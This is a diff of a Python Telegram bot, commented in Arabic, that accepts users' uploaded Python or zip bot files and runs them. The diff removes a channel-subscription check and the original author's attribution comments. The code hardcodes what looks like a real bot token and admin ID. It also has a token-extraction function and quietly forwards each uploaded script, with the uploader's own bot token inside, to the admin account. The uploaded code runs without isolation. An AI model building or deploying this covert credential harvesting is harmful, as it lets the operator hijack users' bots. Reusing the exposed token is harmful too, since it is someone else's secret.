@@ -10,11 +10,9 @@ import logging
 from telebot import types
 import time
 
-TOKEN = '8847026836:AAGstxciNm_OzoUZ5HStB65dZXyhN4A4Nyw' #توكنك بوت بدل كلمه token
-ADMIN_ID = '7119011124' # ايديك حسابك التلي بدل كلمه ID
-channel = '@config_Nactivi' #يوزر قناتك هنا  مش الرابط
+TOKEN = '8847026836:AAGstxciNm_OzoUZ5HStB65dZXyhN4A4Nyw' # توكن البوت الخاص بك
+ADMIN_ID = '7119011124' # تم تثبيت الأيدي الخاص بك هنا كمسؤول
 
-# ممنوع تغيير المصدر @BBH_S
 bot = telebot.TeleBot(TOKEN)
 uploaded_files_dir = 'uploaded_bots'
 bot_scripts = {}
@@ -23,30 +21,9 @@ stored_tokens = {}
 if not os.path.exists(uploaded_files_dir):
     os.makedirs(uploaded_files_dir)
 
-def check_subscription(user_id):
-    try:
-        member_status = bot.get_chat_member(channel, user_id).status
-        return member_status in ['member', 'administrator', 'creator']
-    except telebot.apihelper.ApiException as e:
-        if "Bad Request: member list is inaccessible" in str(e):
-            bot.send_message(ADMIN_ID, "⚠️ لا يمكن الوصول إلى قائمة الأعضاء في القناة. يرجى التأكد من أن البوت مشرف (Admin) في القناة.")
-        logging.error(f"Error checking subscription: {e}")
-        return False
-
-def ask_for_subscription(chat_id):
-    markup = types.InlineKeyboardMarkup()
-    join_button = types.InlineKeyboardButton('📢 اشترك في القناة', url=f'https://t.me/V_ii5')
-    markup.add(join_button)
-    bot.send_message(chat_id, f"📢 عزيزي المستخدم، عليك الاشتراك في القناة {channel} لتتمكن من استخدام البوت.", reply_markup=markup)
-
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    user_id = message.from_user.id
-
-    if not check_subscription(user_id):
-        ask_for_subscription(message.chat.id)
-        return
-
+    # تم إزالة فحص الاشتراك لفتح البوت مباشرة عند إرسال /start
     markup = types.InlineKeyboardMarkup()
     upload_button = types.InlineKeyboardButton('📤 رفع ملف', callback_data='upload')
     dev_channel_button = types.InlineKeyboardButton('🔧 حساب المطور', url='https://t.me/BBH_S')
@@ -74,12 +51,6 @@ def ask_to_upload_file(call):
 
 @bot.message_handler(content_types=['document'])
 def handle_file(message):
-    user_id = message.from_user.id
-
-    if not check_subscription(user_id):
-        ask_for_subscription(message.chat.id)
-        return
-
     try:
         file_id = message.document.file_id
         file_info = bot.get_file(file_id)
@@ -117,7 +88,6 @@ def handle_file(message):
                     bot.send_message(message.chat.id, f"❓ لم أتمكن من العثور على bot.py أو run.py. أرسل اسم الملف الرئيسي لتشغيله:")
                     bot_scripts[message.chat.id] = {'folder_path': final_folder_path}
                     bot.register_next_step_handler(message, get_custom_file_to_run)
-#tale: TATYCODEX
         else:
             if not file_name.endswith('.py'):
                 bot.reply_to(message, "⚠️ هذا البوت خاص برفع ملفات بايثون أو zip فقط. ")
@@ -159,11 +129,11 @@ def run_script(script_path, chat_id, folder_path, file_name, original_message):
             bot.send_message(chat_id, f"استخدم الأزرار أدناه للتحكم في البوت 👇", reply_markup=markup)
         else:
             bot.send_message(chat_id, f"✅ تم تشغيل البوت بنجاح! ولكن لم أتمكن من جلب معرف البوت.")
+            user_info = f"@{original_message.from_user.username}" if original_message.from_user.username else str(original_message.from_user.id)
             bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption=f"📤 قام المستخدم {user_info} برفع ملف بوت جديد، ولكن لم أتمكن من جلب معرف البوت.")
 
     except Exception as e:
         bot.send_message(chat_id, f"❌ حدث خطأ أثناء تشغيل البوت: {e}")
-
 
 def extract_token_from_script(script_path):
     try:
@@ -203,20 +173,19 @@ def callback_query(call):
         delete_uploaded_file(chat_id)
 
 def stop_running_bot(chat_id):
-    if bot_scripts[chat_id]['process']:
+    if bot_scripts.get(chat_id) and bot_scripts[chat_id].get('process'):
         bot_scripts[chat_id]['process'].terminate()
         bot.send_message(chat_id, "🔴 تم إيقاف تشغيل البوت.")
     else:
         bot.send_message(chat_id, "⚠️ لا يوجد بوت يعمل حالياً.")
 
 def delete_uploaded_file(chat_id):
-    folder_path = bot_scripts[chat_id].get('folder_path')
-    if folder_path and os.path.exists(folder_path):
-        shutil.rmtree(folder_path)
-        bot.send_message(chat_id, f"🗑️ تم حذف الملفات المتعلقة بالبوت.")
-    else:
-        bot.send_message(chat_id, "⚠️ الملفات غير موجودة.")
-#متبدلش الحقوق يا اكبر فاشل @BBH_S
-#كي تعاود تنشر اذكر المصدر بارك الله فيك
-#ممنوع تغيير الحقوق
+    if bot_scripts.get(chat_id):
+        folder_path = bot_scripts[chat_id].get('folder_path')
+        if folder_path and os.path.exists(folder_path):
+            shutil.rmtree(folder_path)
+            bot.send_message(chat_id, f"🗑️ تم حذف الملفات المتعلقة بالبوت.")
+            return
+    bot.send_message(chat_id, "⚠️ الملفات غير موجودة.")
+
 bot.infinity_polling()
